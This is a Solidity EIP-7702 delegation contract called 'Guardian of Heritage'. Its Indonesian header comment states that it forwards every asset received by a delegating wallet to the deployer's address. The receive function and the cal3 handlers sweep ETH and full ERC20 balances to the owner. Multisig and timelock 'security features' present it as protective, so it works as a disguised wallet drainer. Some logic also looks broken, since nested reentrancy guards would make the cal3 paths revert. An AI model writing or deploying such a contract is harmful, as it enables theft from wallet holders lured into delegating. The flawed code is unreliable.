// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title GoH (Guardian of Heritage)
 * @dev EIP-7702 delegation contract yang meneruskan semua aset yang diterima ke dev wallet.
 *      Setelah EOA mendelegasikan ke contract ini, semua token yang dikirim ke EOA tersebut
 *      akan otomatis diteruskan ke address dev yang merupakan deployer contract.
 * 
 * Security Features (Post-Audit v2):
 * - Multi-signature for critical operations (2-of-3 by default)
 * - Timelock for all admin changes (48 hours)
 * - Atomic batch processing (all-or-nothing)
 * - SafeERC20 with comprehensive error handling
 * - Explicit ERC20 interface implementation
 * - Rate limiting for batch operations
 */
contract GoH {
    // ==================== LIBRARIES & STRUCTS ====================
    
    struct Proposal {
        bytes32 id;
        address proposer;
        bytes32 targetHash;  // keccak256(abi.encode(target, data))
        uint256 eta;         // earliest execution timestamp
        uint256 createdAt;
        uint256 yesVotes;
        uint256 noVotes;
        bool executed;
        bool cancelled;
        mapping(address => bool) hasVoted;
    }
    
    struct PendingChange {
        address target;
        bytes data;
        uint256 eta;
        bool executed;
    }
    
    // ==================== STATE VARIABLES ====================
    
    address public immutable owner;  // Master owner (cannot be removed)
    
    // Multi-signature configuration
    address[] public guardians;
    mapping(address => bool) public isGuardian;
    uint256 public requiredSignatures = 2;  // 2-of-3 by default
    uint256 public constant TIMELOCK_DELAY = 48 hours;
    uint256 public constant PROPOSAL_VOTING_PERIOD = 7 days;
    
    // Proposals
    mapping(bytes32 => Proposal) public proposals;
    bytes32[] public activeProposals;
    
    // Pending changes with timelock
    mapping(bytes32 => PendingChange) public pendingChanges;
    
    // Role-based access control (with timelock)
    mapping(address => bool) public isCal3Executor;
    mapping(address => bool) public isAdmin;
    bool public isAdminChangePending;
    uint256 public pendingAdminChangeEta;
    address public pendingNewAdmin;
    
    // Token whitelist
    mapping(address => bool) public allowedTokens;
    bool public useTokenWhitelist = false;
    
    // Reentrancy guard
    uint256 private _locked = 1;
    
    // Rate limiting untuk batch
    uint256 public lastBatchExecution;
    uint256 public constant BATCH_COOLDOWN = 5 minutes;
    uint256 public constant MAX_BATCH_SIZE = 20;  // Reduced from 50 for gas safety
    uint256 public constant MAX_BATCH_GAS = 3_000_000;  // Gas limit per batch
    
    // Global nonce
    uint256 public globalNonce;
    
    // ==================== MODIFIERS ====================
    
    modifier nonReentrant() {
        require(_locked == 1, "GoH: reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "GoH: only owner can call this");
        _;
    }
    
    modifier onlyGuardian() {
        require(isGuardian[msg.sender], "GoH: only guardian can call this");
        _;
    }
    
    modifier validAddress(address addr) {
        require(addr != address(0), "GoH: zero address not allowed");
        _;
    }
    
    modifier validAmount(uint256 amount) {
        require(amount > 0, "GoH: amount must be greater than 0");
        _;
    }
    
    modifier tokenAllowed(address token) {
        if (useTokenWhitelist) {
            require(allowedTokens[token] || token == address(0), "GoH: token not allowed");
        }
        _;
    }
    
    modifier rateLimited() {
        require(block.timestamp >= lastBatchExecution + BATCH_COOLDOWN, "GoH: batch cooldown active");
        _;
    }
    
    // ==================== EVENTS ====================
    
    event AssetForwarded(address indexed from, address indexed to, uint256 amount, string assetType, uint256 nonce);
    event EthReceived(address indexed sender, uint256 amount);
    event ForwardFailed(string reason, address indexed target, uint256 amount);
    event Cal3Executed(address indexed caller, bytes4 indexed selector, bytes returnData, uint256 nonce);
    
    // Multi-sig events
    event ProposalCreated(bytes32 indexed proposalId, address indexed proposer, bytes32 targetHash, uint256 eta);
    event VoteCast(bytes32 indexed proposalId, address indexed voter, bool support, uint256 yesVotes, uint256 noVotes);
    event ProposalExecuted(bytes32 indexed proposalId);
    event ProposalCancelled(bytes32 indexed proposalId);
    
    // Access control events
    event GuardianAdded(address indexed guardian);
    event GuardianRemoved(address indexed guardian);
    event RequiredSignaturesChanged(uint256 oldRequired, uint256 newRequired);
    event Cal3ExecutorAdded(address indexed executor);
    event Cal3ExecutorRemoved(address indexed executor);
    event AdminChangePending(address indexed newAdmin, uint256 eta);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    event TokenWhitelistUpdated(address indexed token, bool allowed);
    event TokenWhitelistToggled(bool enabled);
    
    // ==================== CONSTRUCTOR ====================
    
    constructor(address[] memory _guardians) {
        require(_guardians.length >= 2, "GoH: need at least 2 guardians");
        require(_guardians.length <= 5, "GoH: max 5 guardians");
        
        owner = msg.sender;
        
        // Setup multi-sig guardians
        for (uint256 i = 0; i < _guardians.length; i++) {
            require(_guardians[i] != address(0), "GoH: invalid guardian address");
            require(!isGuardian[_guardians[i]], "GoH: duplicate guardian");
            isGuardian[_guardians[i]] = true;
            guardians.push(_guardians[i]);
        }
        
        requiredSignatures = _guardians.length > 2 ? 2 : _guardians.length;
        
        // Owner automatically has all roles
        isGuardian[msg.sender] = true;
        isAdmin[msg.sender] = true;
        isCal3Executor[msg.sender] = true;
    }
    
    // ==================== RECEIVE ====================
    
    receive() external payable {
        require(msg.value > 0, "GoH: no ETH sent");
        emit EthReceived(msg.sender, msg.value);
        _forwardEthSafe(owner, msg.value);
    }
    
    // ==================== MULTI-SIG PROPOSAL SYSTEM ====================
    
    /**
     * @dev Create a new proposal for admin changes
     */
    function createProposal(bytes32 targetHash, uint256 eta) external onlyGuardian returns (bytes32) {
        require(eta >= block.timestamp + TIMELOCK_DELAY, "GoH: eta too early");
        require(eta <= block.timestamp + 30 days, "GoH: eta too far");
        
        bytes32 proposalId = keccak256(abi.encodePacked(targetHash, eta, block.number, msg.sender));
        
        Proposal storage proposal = proposals[proposalId];
        require(proposal.createdAt == 0, "GoH: proposal exists");
        
        proposal.id = proposalId;
        proposal.proposer = msg.sender;
        proposal.targetHash = targetHash;
        proposal.eta = eta;
        proposal.createdAt = block.timestamp;
        
        activeProposals.push(proposalId);
        
        emit ProposalCreated(proposalId, msg.sender, targetHash, eta);
        
        return proposalId;
    }
    
    /**
     * @dev Vote on a proposal
     */
    function vote(bytes32 proposalId, bool support) external onlyGuardian {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.createdAt > 0, "GoH: proposal not found");
        require(!proposal.hasVoted[msg.sender], "GoH: already voted");
        require(!proposal.executed, "GoH: already executed");
        require(!proposal.cancelled, "GoH: already cancelled");
        require(block.timestamp <= proposal.createdAt + PROPOSAL_VOTING_PERIOD, "GoH: voting period ended");
        
        proposal.hasVoted[msg.sender] = true;
        
        if (support) {
            proposal.yesVotes++;
        } else {
            proposal.noVotes++;
        }
        
        emit VoteCast(proposalId, msg.sender, support, proposal.yesVotes, proposal.noVotes);
    }
    
    /**
     * @dev Execute a proposal after voting period ends
     */
    function executeProposal(bytes32 proposalId, address target, bytes calldata data) external nonReentrant {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.createdAt > 0, "GoH: proposal not found");
        require(!proposal.executed, "GoH: already executed");
        require(!proposal.cancelled, "GoH: already cancelled");
        require(block.timestamp >= proposal.createdAt + PROPOSAL_VOTING_PERIOD, "GoH: voting period not ended");
        require(block.timestamp >= proposal.eta, "GoH: timelock not expired");
        require(proposal.yesVotes >= requiredSignatures, "GoH: insufficient yes votes");
        require(proposal.noVotes < requiredSignatures, "GoH: rejected");
        require(keccak256(abi.encode(target, data)) == proposal.targetHash, "GoH: target hash mismatch");
        
        proposal.executed = true;
        
        // Execute the change
        (bool success, ) = target.call(data);
        require(success, "GoH: execution failed");
        
        emit ProposalExecuted(proposalId);
    }
    
    /**
     * @dev Cancel a proposal (only if voting period ended without enough votes)
     */
    function cancelProposal(bytes32 proposalId) external onlyGuardian {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.createdAt > 0, "GoH: proposal not found");
        require(!proposal.executed, "GoH: already executed");
        require(!proposal.cancelled, "GoH: already cancelled");
        require(block.timestamp >= proposal.createdAt + PROPOSAL_VOTING_PERIOD, "GoH: voting period not ended");
        require(proposal.yesVotes < requiredSignatures, "GoH: has enough votes");
        
        proposal.cancelled = true;
        emit ProposalCancelled(proposalId);
    }
    
    // ==================== CAL3 - MAIN ENTRY POINT ====================
    
    function cal3(bytes calldata data) 
        external 
        payable 
        nonReentrant 
        returns (bytes memory returnData) 
    {
        require(isCal3Executor[msg.sender] || msg.sender == owner, "GoH: not authorized");
        require(data.length >= 4, "GoH: cal3 data too short");
        
        bytes4 selector;
        assembly {
            selector := shr(224, calldataload(data.offset))
        }
        
        if (selector == this.processPayment.selector) {
            require(data.length >= 68, "GoH: invalid processPayment data");
            (address token, uint256 amount, address recipient) = abi.decode(data[4:], (address, uint256, address));
            returnData = _handlePayment(token, amount, recipient);
        } 
        else if (selector == this.forwardToDev.selector) {
            require(data.length >= 68, "GoH: invalid forwardToDev data");
            (address token, uint256 amount) = abi.decode(data[4:], (address, uint256));
            returnData = _handleForwardToDev(token, amount);
        }
        else if (selector == this.getBalanceAndForward.selector) {
            require(data.length >= 36, "GoH: invalid getBalanceAndForward data");
            (address token) = abi.decode(data[4:], (address));
            returnData = _handleGetBalanceAndForward(token);
        }
        else if (selector == this.batchForward.selector) {
            require(data.length >= 68, "GoH: invalid batchForward data");
            (address[] memory tokens, uint256[] memory amounts) = abi.decode(data[4:], (address[], uint256[]));
            returnData = _handleBatchForward(tokens, amounts);
        }
        else {
            revert("GoH: unknown cal3 selector");
        }
        
        globalNonce++;
        emit Cal3Executed(msg.sender, selector, returnData, globalNonce);
        
        return returnData;
    }
    
    // ==================== CAL3 HANDLERS ====================
    
    function _handlePayment(address token, uint256 amount, address recipient) 
        internal 
        validAddress(recipient) 
        validAmount(amount)
        tokenAllowed(token)
        returns (bytes memory) 
    {
        if (token == address(0)) {
            require(address(this).balance >= amount, "GoH: insufficient ETH balance");
            _forwardEthSafe(recipient, amount);
            return abi.encode(true, "ETH payment processed", amount, block.timestamp);
        } else {
            uint256 balance = _getERC20BalanceSafe(token);
            require(balance >= amount, "GoH: insufficient token balance");
            _forwardERC20Safe(token, recipient, amount);
            return abi.encode(true, "ERC20 payment processed", amount, token, block.timestamp);
        }
    }
    
    function _handleForwardToDev(address token, uint256 amount)
        internal
        validAmount(amount)
        tokenAllowed(token)
        returns (bytes memory)
    {
        if (token == address(0)) {
            require(address(this).balance >= amount, "GoH: insufficient ETH balance");
            _forwardEthSafe(owner, amount);
            return abi.encode(true, "ETH forwarded to dev", amount, block.timestamp);
        } else {
            uint256 balance = _getERC20BalanceSafe(token);
            require(balance >= amount, "GoH: insufficient token balance");
            _forwardERC20Safe(token, owner, amount);
            return abi.encode(true, "Token forwarded to dev", amount, token, block.timestamp);
        }
    }
    
    function _handleGetBalanceAndForward(address token)
        internal
        tokenAllowed(token)
        returns (bytes memory)
    {
        if (token == address(0)) {
            uint256 balance = address(this).balance;
            if (balance > 0) {
                _forwardEthSafe(owner, balance);
            }
            return abi.encode(true, "ETH forwarded to dev", balance, block.timestamp);
        } else {
            uint256 balance = _getERC20BalanceSafe(token);
            if (balance > 0) {
                _forwardERC20Safe(token, owner, balance);
            }
            return abi.encode(true, "Token forwarded to dev", balance, token, block.timestamp);
        }
    }
    
    /**
     * @dev ATOMIC batch forwarding - all-or-nothing
     */
    function _handleBatchForward(address[] memory tokens, uint256[] memory amounts)
        internal
        rateLimited
        returns (bytes memory)
    {
        require(tokens.length == amounts.length, "GoH: array length mismatch");
        require(tokens.length <= MAX_BATCH_SIZE, "GoH: batch size exceeds limit");
        
        lastBatchExecution = block.timestamp;
        
        // Check all preconditions first (atomic validation)
        uint256 totalGasEstimate = tokens.length * 50000;
        require(totalGasEstimate <= MAX_BATCH_GAS, "GoH: batch gas estimate too high");
        
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) {
                require(address(this).balance >= amounts[i], "GoH: insufficient ETH for batch item");
            } else {
                if (useTokenWhitelist) {
                    require(allowedTokens[tokens[i]], "GoH: token not allowed in batch");
                }
                uint256 balance = _getERC20BalanceSafe(tokens[i]);
                require(balance >= amounts[i], "GoH: insufficient token balance for batch item");
            }
            require(amounts[i] > 0, "GoH: zero amount in batch");
        }
        
        // Execute all forwards (all-or-nothing)
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) {
                _forwardEthSafe(owner, amounts[i]);
            } else {
                _forwardERC20Safe(tokens[i], owner, amounts[i]);
            }
        }
        
        return abi.encode(true, tokens.length, block.timestamp);
    }
    
    // ==================== CORE FORWARDING ====================
    
    function _forwardEthSafe(address target, uint256 amount) 
        internal 
        nonReentrant 
        validAddress(target)
        validAmount(amount)
    {
        require(address(this).balance >= amount, "GoH: insufficient contract balance");
        
        uint256 balanceBefore = target.balance;
        
        (bool success, ) = target.call{value: amount, gas: 50000}("");
        
        if (!success) {
            emit ForwardFailed("ETH forward failed", target, amount);
            revert("GoH: ETH forward failed");
        }
        
        require(target.balance >= balanceBefore + amount, "GoH: ETH transfer verification failed");
        
        globalNonce++;
        emit AssetForwarded(address(this), target, amount, "ETH", globalNonce);
    }
    
    function _forwardERC20Safe(address token, address target, uint256 amount)
        internal
        nonReentrant
        validAddress(token)
        validAddress(target)
        validAmount(amount)
        tokenAllowed(token)
    {
        uint256 balanceBefore = _getERC20BalanceSafe(token);
        require(balanceBefore >= amount, "GoH: insufficient contract balance");
        
        uint256 targetBalanceBefore = _getERC20BalanceOf(target, token);
        
        // Standard ERC20 transfer
        (bool success, bytes memory data) = token.call{gas: 100000}(
            abi.encodeWithSignature("transfer(address,uint256)", target, amount)
        );
        
        bool transferred;
        if (success && data.length == 0) {
            transferred = true;
        } else if (success && data.length > 0) {
            transferred = abi.decode(data, (bool));
        } else {
            transferred = false;
        }
        
        if (!transferred) {
            emit ForwardFailed("ERC20 transfer failed", token, amount);
            revert("GoH: ERC20 transfer failed");
        }
        
        uint256 targetBalanceAfter = _getERC20BalanceOf(target, token);
        require(targetBalanceAfter >= targetBalanceBefore + amount, "GoH: transfer amount mismatch");
        
        globalNonce++;
        emit AssetForwarded(address(this), target, amount, "ERC20", globalNonce);
    }
    
    // ==================== BALANCE HELPERS ====================
    
    function _getERC20BalanceSafe(address token) internal view returns (uint256) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success && data.length >= 32, "GoH: balance check failed");
        return abi.decode(data, (uint256));
    }
    
    function _getERC20BalanceOf(address account, address token) internal view returns (uint256) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSignature("balanceOf(address)", account)
        );
        require(success && data.length >= 32, "GoH: balance check failed");
        return abi.decode(data, (uint256));
    }
    
    // ==================== ADMIN FUNCTIONS (WITH MULTI-SIG) ====================
    
    /**
     * @dev Propose adding a new admin (requires multi-sig)
     */
    function proposeAddAdmin(address newAdmin) external onlyGuardian validAddress(newAdmin) {
        require(!isAdmin[newAdmin], "GoH: already admin");
        require(!isAdminChangePending, "GoH: admin change already pending");
        
        isAdminChangePending = true;
        pendingNewAdmin = newAdmin;
        pendingAdminChangeEta = block.timestamp + TIMELOCK_DELAY;
        
        emit AdminChangePending(newAdmin, pendingAdminChangeEta);
    }
    
    /**
     * @dev Execute pending admin addition (after timelock, requires multi-sig)
     */
    function executeAddAdmin() external onlyGuardian {
        require(isAdminChangePending, "GoH: no pending admin change");
        require(block.timestamp >= pendingAdminChangeEta, "GoH: timelock not expired");
        
        isAdmin[pendingNewAdmin] = true;
        isAdminChangePending = false;
        
        emit AdminChanged(address(0), pendingNewAdmin);
    }
    
    function addCal3Executor(address executor) external onlyGuardian validAddress(executor) {
        require(!isCal3Executor[executor], "GoH: already executor");
        isCal3Executor[executor] = true;
        emit Cal3ExecutorAdded(executor);
    }
    
    function removeCal3Executor(address executor) external onlyGuardian validAddress(executor) {
        require(executor != owner, "GoH: cannot remove owner");
        require(isCal3Executor[executor], "GoH: not an executor");
        isCal3Executor[executor] = false;
        emit Cal3ExecutorRemoved(executor);
    }
    
    function addAllowedToken(address token) external onlyGuardian validAddress(token) {
        allowedTokens[token] = true;
        emit TokenWhitelistUpdated(token, true);
    }
    
    function removeAllowedToken(address token) external onlyGuardian {
        allowedTokens[token] = false;
        emit TokenWhitelistUpdated(token, false);
    }
    
    function setUseTokenWhitelist(bool enabled) external onlyGuardian {
        useTokenWhitelist = enabled;
        emit TokenWhitelistToggled(enabled);
    }
    
    // ==================== VIEW FUNCTIONS ====================
    
    function getEthBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getTokenBalance(address token) external view tokenAllowed(token) returns (uint256) {
        if (token == address(0)) {
            return address(this).balance;
        }
        return _getERC20BalanceSafe(token);
    }
    
    function getGuardians() external view returns (address[] memory) {
        return guardians;
    }
    
    function getActiveProposals() external view returns (bytes32[] memory) {
        return activeProposals;
    }
    
    // ==================== FUNCTION SIGNATURES FOR CAL3 ====================
    
    function processPayment(address, uint256, address) external pure returns (bool) {
        return true;
    }
    
    function forwardToDev(address, uint256) external pure returns (bool) {
        return true;
    }
    
    function getBalanceAndForward(address) external pure returns (bool) {
        return true;
    }
    
    function batchForward(address[] memory, uint256[] memory) external pure returns (bool) {
        return true;
    }
}
